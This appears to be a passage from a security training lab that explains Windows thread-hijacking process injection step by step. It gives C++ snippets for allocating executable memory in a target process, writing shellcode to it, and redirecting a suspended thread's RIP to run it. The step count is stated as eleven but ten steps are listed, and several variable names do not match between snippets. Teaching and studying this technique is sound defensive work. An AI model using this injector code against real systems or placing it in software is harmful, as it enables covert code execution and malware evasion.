# Task 4 - Abusing Process Components

At a high-level, **thread (execution) hijacking** can be broken up into eleven steps:

1. Locate and open a target process to control.
2. Allocate memory region for malicious code.
3. Write malicious code to allocated memory.
4. Identify the thread ID of the target thread to hijack.
5. Open the target thread.
6. Suspend the target thread.
7. Obtain the thread context.
8. Update the instruction pointer to the malicious code.
9. Rewrite the target thread context.
10. Resume the hijacked thread.

We will break down a basic thread hijacking script to identify each of the steps and explain in more depth below.

The first three steps outlined in this technique follow the same common steps as normal process injection. These will not be explained; instead, you can find the documented source code below.

---

## Steps 1-3: Process Preparation and Memory Injection

```cpp
HANDLE hProcess = OpenProcess(
   PROCESS_ALL_ACCESS, // Requests all possible access rights
   FALSE,              // Child processes do not inherit parent process handle
   processId           // Stored process ID
);

PVOID remoteBuffer = VirtualAllocEx(
   hProcess,                   // Opened target process
   NULL,
   sizeof shellcode,           // Region size of memory allocation
   (MEM_RESERVE | MEM_COMMIT), // Reserves and commits pages
   PAGE_EXECUTE_READWRITE      // Enables execution and read/write access to the committed pages
);

WriteProcessMemory(
   processHandle,    // Opened target process
   remoteBuffer,     // Allocated memory region
   shellcode,        // Data to write
   sizeof shellcode, // Byte size of data
   NULL
);
```

Once the initial steps are out of the way and our shellcode is written to memory, we can move to step four.

---

## Step 4: Identify the Thread ID

At step four, we need to begin the process of hijacking the process thread by identifying the thread ID. To identify the thread ID, we need to use a trio of Windows API calls: `CreateToolhelp32Snapshot()`, `Thread32First()`, and `Thread32Next()`. These API calls will collectively loop through a snapshot of a process and extend capabilities to enumerate process information.

```cpp
THREADENTRY32 threadEntry;

HANDLE hSnapshot = CreateToolhelp32Snapshot( // Snapshot the specified process
   TH32CS_SNAPTHREAD, // Include all processes residing on the system
   0                  // Indicates the current process
);

Thread32First( // Obtains the first thread in the snapshot
   hSnapshot,    // Handle of the snapshot
   &threadEntry  // Pointer to the THREADENTRY32 structure
);

while (Thread32Next( // Obtains the next thread in the snapshot
   snapshot,     // Handle of the snapshot
   &threadEntry  // Pointer to the THREADENTRY32 structure
)) {
   // ... logic to find target thread
}
```

---

## Step 5: Open the Target Thread

At step five, we have gathered all the required information in the structure pointer and can open the target thread. To open the thread, we will use `OpenThread` with the `THREADENTRY32` structure pointer.

```cpp
if (threadEntry.th32OwnerProcessID == processID) // Verifies both parent process IDs match
{
   HANDLE hThread = OpenThread(
       THREAD_ALL_ACCESS,       // Requests all possible access rights
       FALSE,                   // Child threads do not inherit parent thread handle
       threadEntry.th32ThreadID // Reads the thread ID from the THREADENTRY32 structure pointer
   );
   break;
}
```

---

## Steps 6 and 7: Suspend and Obtain Context

At step six, we must suspend the opened target thread. To suspend the thread, we can use `SuspendThread`.

```cpp
SuspendThread(hThread);
```

At step seven, we need to obtain the thread context to use in the upcoming API calls. This can be done using `GetThreadContext` to store a pointer.

```cpp
CONTEXT context;
GetThreadContext(
   hThread,  // Handle for the thread
   &context  // Pointer to store the context structure
);
```

---

## Steps 8 and 9: Redirect Execution (RIP Hijacking)

At step eight, we need to overwrite **RIP** (Instruction Pointer Register) to point to our malicious region of memory. **RIP** is an x64 register that will determine the next code instruction; in a nutshell, it controls the flow of an application in memory. To overwrite the register, we can update the thread context for RIP.

```cpp
context.Rip = (DWORD_PTR)remoteBuffer; // Points RIP to our malicious buffer allocation
```

At step nine, the context is updated and needs to be rewritten to the current thread context. This can be easily done using `SetThreadContext` and the pointer for the context.

```cpp
SetThreadContext(
   hThread,  // Handle for the thread
   &context  // Pointer to the context structure
);
```

---

## Step 10: Resume the Hijacked Thread

At the final step, we can now take the target thread out of a suspended state. To accomplish this, we can use `ResumeThread`.

```cpp
ResumeThread(
   hThread // Handle for the thread
);
```

We can compile these steps together to create a process injector via thread hijacking. Use the C++ injector provided and experiment with thread hijacking.

